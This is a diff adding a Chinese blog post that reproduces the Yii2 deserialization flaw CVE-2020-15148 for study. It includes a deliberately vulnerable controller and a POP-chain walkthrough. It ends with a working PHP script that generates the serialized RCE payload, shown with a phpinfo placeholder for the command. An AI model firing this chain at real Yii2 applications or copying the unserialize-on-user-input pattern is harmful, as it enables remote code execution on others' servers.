@@ -1,0 +1,617 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>Yii2框架 反序列化漏洞复现 - T1p3 Site</title><meta name=Description content="关于 LoveIt 主题"><meta property="og:title" content="Yii2框架 反序列化漏洞复现"><meta property="og:description" content="前言 最近学习PHP反序列化遇到了Yii2反序列化得利用，就顺便搭一下环境，跟着网上各种师傅们的文章复现和学习，提高自己代码审计能力。 漏洞出现"><meta property="og:type" content="article"><meta property="og:url" content="https://example.com/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><meta property="og:image" content="https://example.com"><meta property="article:published_time" content="2022-01-19T09:09:34+08:00"><meta property="article:modified_time" content="2022-01-19T09:09:34+08:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://example.com"><meta name=twitter:title content="Yii2框架 反序列化漏洞复现"><meta name=twitter:description content="前言 最近学习PHP反序列化遇到了Yii2反序列化得利用，就顺便搭一下环境，跟着网上各种师傅们的文章复现和学习，提高自己代码审计能力。 漏洞出现"><meta name=application-name content="LoveIt"><meta name=apple-mobile-web-app-title content="LoveIt"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://example.com/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/><link rel=prev href=https://example.com/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Yii2框架 反序列化漏洞复现","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/example.com\/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\/"},"genre":"posts","keywords":"yii2框架","wordcount":3003,"url":"https:\/\/example.com\/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\/","datePublished":"2022-01-19T09:09:34+08:00","dateModified":"2022-01-19T09:09:34+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"T1p3"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':('auto'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'auto'==='dark'))&&document.body.setAttribute('theme','dark');</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="T1p3 Site"><span class=header-title-pre><i class="far fa-kiss-wink-heart fa-fw"></i></span>T1p3</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>所有文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><a class=menu-item href=/about/>关于 </a><a class=menu-item href=/friends/>友链 </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item language" title=选择语言>简体中文<i class="fas fa-chevron-right fa-fw"></i>
+<select class=language-select id=language-select-desktop onchange="location=this.value;"><option value=/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ selected>简体中文</option></select>
+</a><span class="menu-item search" id=search-desktop><input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i></a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i></a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span></span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="T1p3 Site"><span class=header-title-pre><i class="far fa-kiss-wink-heart fa-fw"></i></span>T1p3</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i></a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i></a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/>所有文章</a><a class=menu-item href=/tags/>标签</a><a class=menu-item href=/categories/>分类</a><a class=menu-item href=/about/>关于</a><a class=menu-item href=/friends/>友链</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
+<i class="fas fa-adjust fa-fw"></i></a><a href=javascript:void(0); class=menu-item title=选择语言>简体中文<i class="fas fa-chevron-right fa-fw"></i>
+<select class=language-select onchange="location=this.value;"><option value=/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ selected>简体中文</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">Yii2框架 反序列化漏洞复现</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>T1p3</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/web/><i class="far fa-folder fa-fw"></i>web</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2022-01-19>2022-01-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3003 字&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
+<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><ul><li><a href=#前言>前言</a><ul><li><a href=#yii2介绍>Yii2介绍</a></li><li><a href=#环境搭建>环境搭建</a></li></ul></li><li><a href=#2307版本反序列化>2.3.07版本反序列化</a><ul><li><ul><li><a href=#poc1>POC1</a></li></ul></li></ul></li><li><a href=#2308版本反序列化>2.3.08版本反序列化</a><ul><li><ul><li><a href=#利用链1>利用链1</a></li><li><a href=#poc2>Poc2</a></li><li><a href=#利用链2>利用链2</a></li><li><a href=#poc3>POC3</a></li></ul></li></ul></li><li><a href=#小结>小结</a></li></ul></li></ul></nav></div></div><div class=content id=content><h3 id=前言>前言</h3><p>最近学习PHP反序列化遇到了Yii2反序列化得利用，就顺便搭一下环境，跟着网上各种师傅们的文章复现和学习，提高自己代码审计能力。</p><p>漏洞出现在yii2.0.38之前的版本中,在2.0.38进行了修复，CVE编号是CVE-2020-15148：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>Yii 2 (yiisoft/yii2) before version 2.0.38 is vulnerable to remote code execution if the application calls unserialize() on arbitrary user input. This is fixed in version 2.0.38. A possible workaround without upgrading is available in the linked advisory.
+</code></pre></td></tr></table></div></div><h4 id=yii2介绍>Yii2介绍</h4><p>Yii 是一个高性能，基于组件的 PHP 框架，用于快速开发现代 Web 应用程序。即可以用于开发各种用 PHP 构建的 Web 应用。因为基于组件的框架结构和设计精巧的缓存支持，它特别适合开发大型应用， 如门户网站、社区、内容管理系统（CMS）、 电子商务项目和 RESTful Web 服务等。</p><h4 id=环境搭建>环境搭建</h4><p>windows10 phpstudy</p><p>yii2版本:2.037和2.0.38</p><p>php版本:7.3.4</p><p>修改<code>config\web.php</code>中的<code>cookieValidationKey</code>为任意值，作为<code>yii\web\request::cookieValidationKey</code>的加密值，不设置就会报错。</p><p>接着自己添加一个<code>controller</code>来进行漏洞的利用，创建一个action: http://url/index.php?r=test/test, controllers的命名是 : <code>名称Controller</code>，action的命名是: <code>action名称</code>，如下</p><p><code>controllers/TestController.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
+
+<span class=k>namespace</span> <span class=nx>app\controllers</span><span class=p>;</span>
+
+<span class=k>use</span> <span class=nx>yii\web\Controller</span><span class=p>;</span>
+
+<span class=k>class</span> <span class=nc>TestController</span> <span class=k>extends</span> <span class=nx>Controller</span><span class=p>{</span>
+    <span class=k>public</span> <span class=k>function</span> <span class=nf>actionTest</span><span class=p>(</span><span class=nv>$data</span><span class=p>){</span>
+        <span class=k>return</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$data</span><span class=p>));</span>
+    <span class=p>}</span>
+<span class=p>}</span>
+<span class=cp>?&gt;</span>
+</code></pre></td></tr></table></div></div><p>发包测试，环境搭建成功</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-001.jpg data-srcset="/yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-001.jpg, /yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-001.jpg 1.5x, /yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-001.jpg 2x" data-sizes=auto alt=/yii2框架-反序列化漏洞复现/yii2-001.jpg title=/yii2框架-反序列化漏洞复现/yii2-001.jpg></p><h3 id=2307版本反序列化>2.3.07版本反序列化</h3><h5 id=poc1>POC1</h5><p>漏洞的触发点在<code>\yii\vendor\yii2\db\BatchQueryResult.php</code>文件中，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>   public function __destruct()
+    {
+        // make sure cursor is closed
+        $this-&gt;reset();
+    }
+
+    public function reset()
+    {
+        if ($this-&gt;_dataReader !== null) {
+            $this-&gt;_dataReader-&gt;close();
+        }
+        $this-&gt;_dataReader = null;
+        $this-&gt;_batch = null;
+        $this-&gt;_value = null;
+        $this-&gt;_key = null;
+    }
+</code></pre></td></tr></table></div></div><p>可以看到，<code>__destruct</code>调用了<code>reset</code>方法 <code>reset</code>方法<code>reset</code>调用了<code>close</code>方法，参数 <code>_dataReader</code>可控。学习思路后知道这里可以通过触发 <code>__call</code>方法来进行利用</p><ul><li>__call:当一个对象在对象上下文中调用不可访问的方法时触发</li></ul><p>当一个对象调用不可访问的<code>close</code>方法或者类中压根就没有<code>close</code>方法，即可触发 <code>__call</code>,全局搜索 <code>__call</code>方法</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-002.jpg data-srcset="/yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-002.jpg, /yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-002.jpg 1.5x, /yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-002.jpg 2x" data-sizes=auto alt=/yii2框架-反序列化漏洞复现/yii2-002.jpg title=/yii2框架-反序列化漏洞复现/yii2-002.jpg></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>public function __call($method, $attributes)
+{
+   	return $this-&gt;format($method, $attributes);
+}
+public function format($formatter, $arguments = array())
+{
+    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);
+}
+public function getFormatter($formatter)
+{
+        if (isset($this-&gt;formatters[$formatter])) {
+            return $this-&gt;formatters[$formatter];
+        }
+        foreach ($this-&gt;providers as $provider) {
+            if (method_exists($provider, $formatter)) {
+                $this-&gt;formatters[$formatter] = array($provider, $formatter);
+
+                return $this-&gt;formatters[$formatter];
+            }
+        }
+        throw new \InvalidArgumentException(sprintf(&#39;Unknown formatter &#34;%s&#34;&#39;, $formatter));
+}
+
+</code></pre></td></tr></table></div></div><p><code>__call</code>方法调用了类中的 <code>format</code>的方法，<code>format</code>方法里的 <code>call_user_func_array</code>里的参数调用了 <code>getFormatter</code>方法</p><ul><li><p><code>call_user_func_array</code> :调用回调函数，并把一个数组参数作为回调函数的参数</p><p>大致使用方法如下:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
+<span class=k>function</span> <span class=nf>foobar</span><span class=p>(</span><span class=nv>$arg</span><span class=p>,</span> <span class=nv>$arg2</span><span class=p>)</span> <span class=p>{</span>
+    <span class=k>echo</span> <span class=no>__FUNCTION__</span><span class=p>,</span> <span class=s2>&#34; got </span><span class=si>$arg and $arg2\n</span><span class=s2>&#34;</span><span class=p>;</span>
+<span class=p>}</span>
+<span class=k>class</span> <span class=nc>foo </span><span class=p>{</span>
+    <span class=k>function</span> <span class=nf>bar</span><span class=p>(</span><span class=nv>$arg</span><span class=p>,</span> <span class=nv>$arg2</span><span class=p>)</span> <span class=p>{</span>
+        <span class=k>echo</span> <span class=no>__METHOD__</span><span class=p>,</span> <span class=s2>&#34; got </span><span class=si>$arg and $arg2\n</span><span class=s2>&#34;</span><span class=p>;</span>
+    <span class=p>}</span>
+<span class=p>}</span>
+  
+  
+<span class=c1>// Call the foobar() function with 2 arguments
+</span><span class=c1></span><span class=nx>call_user_func_array</span><span class=p>(</span><span class=s2>&#34;foobar&#34;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;one&#34;</span><span class=p>,</span> <span class=s2>&#34;two&#34;</span><span class=p>));</span>
+  
+<span class=c1>// Call the $foo-&gt;bar() method with 2 arguments
+</span><span class=c1></span><span class=nv>$foo </span><span class=o>=</span> <span class=k>new</span> <span class=nx>foo</span><span class=p>;</span>
+<span class=nx>call_user_func_array</span><span class=p>(</span><span class=k>array</span><span class=p>(</span><span class=nv>$foo</span><span class=p>,</span> <span class=s2>&#34;bar&#34;</span><span class=p>),</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;three&#34;</span><span class=p>,</span> <span class=s2>&#34;four&#34;</span><span class=p>));</span>
+<span class=cp>?&gt;</span>
+</code></pre></td></tr></table></div></div></li></ul><p><code>getFormatter</code>方法从 <code>$this->formatter</code>可控，所以这里可以调用任意类中的任意方法了。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-003.jpg data-srcset="/yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-003.jpg, /yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-003.jpg 1.5x, /yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-003.jpg 2x" data-sizes=auto alt=/yii2框架-反序列化漏洞复现/yii2-003.jpg title=/yii2框架-反序列化漏洞复现/yii2-003.jpg></p><p>但是 <code>$arguments</code>是从 <code>yii\db\BatchQueryResult::reset()</code>里传过来的，我门不可控，比如这里就为空，因为传来的 <code>close</code>方法中传参数值，所以我们只能不带参数地去调用别的类中的方法。</p><p>到这一步就需要一个执行类，这时候需要类中的方法需要满足两个条件</p><ol><li>方法所需的参数只能是其自己类中存在的(即参数: <code>$this->args</code>)</li><li>方法需要有命令执行功能</li></ol><p>通过全局查找正则匹配 <code>call_user_func\(\$this->([a-zA-Z0-9]+), \$this->([a-zA-Z0-9]+)</code>来查找，结果如下</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-004.jpg data-srcset="/yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-004.jpg, /yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-004.jpg 1.5x, /yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-004.jpg 2x" data-sizes=auto alt=/yii2框架-反序列化漏洞复现/yii2-004.jpg title=/yii2框架-反序列化漏洞复现/yii2-004.jpg></p><ul><li><code>call_user_func</code> :把第一个参数作为回调函数用，这里用 <code>call_user_func</code>即可达到命令执行的效果也可以达到 <code>RCE</code> 的效果</li></ul><p>大致使用方法如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>&lt;?php
+error_reporting(E_ALL);
+function increment(&amp;$var)
+{
+    $var++;
+}
+
+$a = 0;
+call_user_func(&#39;increment&#39;, $a);
+echo $a.&#34;\n&#34;;
+
+call_user_func_array(&#39;increment&#39;, array(&amp;$a)); // You can use this instead before PHP 5.3
+echo $a.&#34;\n&#34;;
+?&gt;
+</code></pre></td></tr></table></div></div><p>其中有两个类中的 <code>run</code>方法可用</p><ol><li><code>yii\rest\CreateAction::run()</code> ，<code>$this->id</code>两个参数可控</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>public function run()
+    {
+        if ($this-&gt;checkAccess) {
+            call_user_func($this-&gt;checkAccess, $this-&gt;id);
+        }  //主要还是看这里
+
+        /* @var $model \yii\db\ActiveRecord */
+        $model = new $this-&gt;modelClass([
+            &#39;scenario&#39; =&gt; $this-&gt;scenario,
+        ]);
+
+        $model-&gt;load(Yii::$app-&gt;getRequest()-&gt;getBodyParams(), &#39;&#39;);
+        if ($model-&gt;save()) {
+            $response = Yii::$app-&gt;getResponse();
+            $response-&gt;setStatusCode(201);
+            $id = implode(&#39;,&#39;, array_values($model-&gt;getPrimaryKey(true)));
+            $response-&gt;getHeaders()-&gt;set(&#39;Location&#39;, Url::toRoute([$this-&gt;viewAction, &#39;id&#39; =&gt; $id], true));
+        } elseif (!$model-&gt;hasErrors()) {
+            throw new ServerErrorHttpException(&#39;Failed to create the object for unknown reason.&#39;);
+        }
+
+        return $model;
+    }
+</code></pre></td></tr></table></div></div><ol start=2><li><code>\yii\rest\IndexAction::run()</code>, <code>$this->checkAccess,$this->id</code>两个参数可控</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>    public function run()
+    {
+        if ($this-&gt;checkAccess) {
+            call_user_func($this-&gt;checkAccess, $this-&gt;id);
+        }
+
+        return $this-&gt;prepareDataProvider();
+    }
+</code></pre></td></tr></table></div></div><p>于是就可以构造完整的 <code>pop</code>链</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>yii\db\BatchQueryResult::__destruct()-&gt;reset()-&gt;close()
+-&gt;
+Faker\Generator::__call()-&gt;format()-&gt;call_user_func_array()
+-&gt;
+\yii\rest\IndexAction::run-&gt;call_user_func()
+</code></pre></td></tr></table></div></div><p>Exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
+<span class=k>namespace</span> <span class=nx>yii\rest</span><span class=p>{</span>
+    <span class=k>class</span> <span class=nc>IndexAction</span><span class=p>{</span>
+        <span class=k>public</span> <span class=nv>$checkAccess</span><span class=p>;</span>
+        <span class=k>public</span> <span class=nv>$id</span><span class=p>;</span>
+
+        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>checkAccess</span> <span class=o>=</span> <span class=s1>&#39;phpinfo&#39;</span><span class=p>;</span>
+            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>id</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span><span class=p>;</span>           <span class=c1>//command
+</span><span class=c1></span>        <span class=p>}</span>
+    <span class=p>}</span>
+<span class=p>}</span>
+
+<span class=k>namespace</span> <span class=nx>Faker</span><span class=p>{</span>
+    <span class=k>use</span> <span class=nx>yii\rest\IndexAction</span><span class=p>;</span>
+
+    <span class=k>class</span> <span class=nc>Generator</span><span class=p>{</span>
+        <span class=k>protected</span> <span class=nv>$formatters</span><span class=p>;</span>
+
+        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>formatters</span><span class=p>[</span><span class=s1>&#39;close&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=p>[</span><span class=k>new</span> <span class=nx>IndexAction</span><span class=p>,</span> <span class=s1>&#39;run&#39;</span><span class=p>];</span>
+        <span class=p>}</span>
+    <span class=p>}</span>
+<span class=p>}</span>
+
+<span class=k>namespace</span> <span class=nx>yii\db</span><span class=p>{</span>
+    <span class=k>use</span> <span class=nx>Faker\Generator</span><span class=p>;</span>
+
+    <span class=k>class</span> <span class=nc>BatchQueryResult</span><span class=p>{</span>
+        <span class=k>private</span> <span class=nv>$_dataReader</span><span class=p>;</span>
+
+        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>_dataReader</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Generator</span><span class=p>;</span>
+        <span class=p>}</span>
+    <span class=p>}</span>
+<span class=p>}</span>
+<span class=k>namespace</span><span class=p>{</span>
+    <span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>yii\db\BatchQueryResult</span><span class=p>));</span>
+<span class=p>}</span>
+<span class=cp>?&gt;</span>
